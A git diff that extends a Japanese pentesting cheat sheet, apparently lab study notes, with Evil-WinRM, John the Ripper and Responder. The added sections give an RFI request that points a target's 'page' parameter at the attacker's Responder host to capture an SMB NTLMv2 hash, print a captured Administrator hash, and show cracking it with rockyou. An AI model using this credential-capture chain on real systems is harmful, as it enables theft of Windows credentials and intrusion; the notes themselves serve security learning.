@@ -8,7 +8,7 @@
   - [スキャン](#スキャン)
   - [リモートログイン](#リモートログイン)
   - [ファイル共有](#ファイル共有)
-  - [Web Directory Fuzzing](#web-directory-fuzzing)
+  - [Web](#web)
   - [Database](#database)
 - [ツール](#ツール)
   - [nmap](#nmap)
@@ -18,6 +18,9 @@
   - [smbclient](#smbclient)
   - [gobuster](#gobuster)
     - [SecList](#seclist)
+  - [Evil-WinRM](#evil-winrm)
+  - [John The Ripper](#john-the-ripper)
+  - [Responder](#responder)
 - [テンプレート](#テンプレート)
   - [SQL Injection](#sql-injection)
   - [MySQL](#mysql)
@@ -32,6 +35,8 @@
 - ポートスキャン
   - 空いているポートを確認する
   - [nmap](#nmap)
+- ハッシュ値解析
+  - [John The Ripper](#john-the-ripper)
 
 ## リモートログイン
 
@@ -42,6 +47,10 @@
       - admin
       - administrator
   - [telnet](#telnet)
+- Evil-WinRM
+  - Windowsサーバにログインするツール
+  - ポート番号 5985 Microsoft HTTPAPI httpdが使われていたら使えるかも
+  - [Evil-WinRM](#evil-winrm)
 
 ## ファイル共有
 
@@ -55,11 +64,16 @@
   - ポート番号: 445
   - [smbclient](#smbclient)
 
-## Web Directory Fuzzing
+## Web
 
 - gobuster
   - ウェブのディレクトリやファイルを見つけるためにブルートフォースアタック
   - [gobuster](#gobuster)
+- responder
+  - RFI(Remote File Include)攻撃
+  - NTLM認証(チャレンジ/レスポンスメカニズム)を使っているときに使用
+  - ハッシュ値を取得してJohn The Ripperで解析する
+  - 
 
 ## Database
 
@@ -155,6 +169,77 @@ sudo apt install seclists
 
 インストール後``/usr/share/seclists``ディレクトリにパスワードのリストが保管される
 
+## Evil-WinRM
+
+[Evil-WinRM Github](https://github.com/Hackplayers/evil-winrm)
+
+This shell is the ultimate WinRM shell for hacking/pentesting.
+
+```bash
+evil-winrm -i <IPアドレス> -u <ユーザ名> -p <パスワード>
+```
+
+## John The Ripper
+
+Responderで生成したハッシュ値をJohn The Ripperでクラック
+
+```bash
+sudo john -w=/usr/share/wordlists/rockyou.txt <ハッシュ値のファイルパス>
+```
+
+すでにクラック済みである場合は
+
+```bash
+sudo john --show <ハッシュ値のファイルパス>
+```
+
+## Responder
+
+使い方
+
+```
+$ sudo responder -I tun0
+
+-- 省略
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.16.37] //ここのIPアドレスを使ってRFIを行う
+    Responder IPv6             [dead:beef:4::1023]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+-- 省略
+
+[+] Listening for events...
+
+```
+
+攻撃したいサイトにリクエスト
+
+```
+http://<host name>/index.php?page=//<Reponder IP>/whatever
+```
+
+するとターミナル上で以下の表示がでる
+
+```
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.129.160.239
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:e31b0661886ee2fe:A57075CC145AD0B4DBF2DC799B36D567:01010000000000000027AB2E9BE1DA01D433F70BDD19F0FB0000000002000800420037004A00480001001E00570049004E002D00510053005A004E0043005A003200420049003100330004003400570049004E002D00510053005A004E0043005A00320042004900310033002E00420037004A0048002E004C004F00430041004C0003001400420037004A0048002E004C004F00430041004C0005001400420037004A0048002E004C004F00430041004C00070008000027AB2E9BE1DA01060004000200000008003000300000000000000001000000002000003D21F00C78CFB8C1C6B784468A283FCCBE695909EFB158145D88A6A7819BDAF90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330037000000000000000000
+
+```
+
+Administratorのハッシュ値をjohn the ripperにかける
+
+Hash値は以下のフォルダに保存してある
+
+```
+/usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.53.222.txt
+```
+
 # テンプレート
 
 ## SQL Injection
@@ -205,4 +290,5 @@ select version();
 |番号|プロトコル|
 |-|-|
 |3306|MySQL|
+|5985|Microsoft HTTPAPI httpd|
 |6379|Redis|
